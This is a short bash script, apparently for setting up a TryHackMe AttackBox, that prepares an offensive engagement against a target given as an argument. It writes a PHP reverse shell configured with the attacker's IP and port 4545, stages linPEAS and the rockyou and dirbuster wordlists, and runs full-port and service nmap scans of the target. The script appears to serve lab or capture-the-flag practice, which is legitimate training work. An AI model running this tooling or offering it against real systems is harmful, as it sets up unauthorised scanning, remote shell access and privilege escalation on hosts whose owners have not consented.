apt install xclip cewl jq html2text crunch -y 
export IP=$(hostname | tr \- \. | sed 's/ip.//')
sed 's/PUT_THM_ATTACKBOX_IP_HERE/'$IP'/' /usr/share/webshells/php/php-reverse-shell.php | sed 's/1234/4545/' >mishell.php
cp /opt/PEAS/linPEAS/linpeas.sh .
cp /usr/share/wordlists/rockyou.txt /
grep -ve "[A-Za-z\ ]\{30,500\}" /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt >/directory-list-2.3-medium.txt
echo "$1 $2">>/etc/hosts
firefox http://$1 &
nmap -p- --min-rate=5000 -n -Pn -oN allports $1
ports=$(cat allports | grep /tcp | cut -d\/ -f1 | xargs | tr " " ",")
nmap -A -oN targeted -p$ports $1
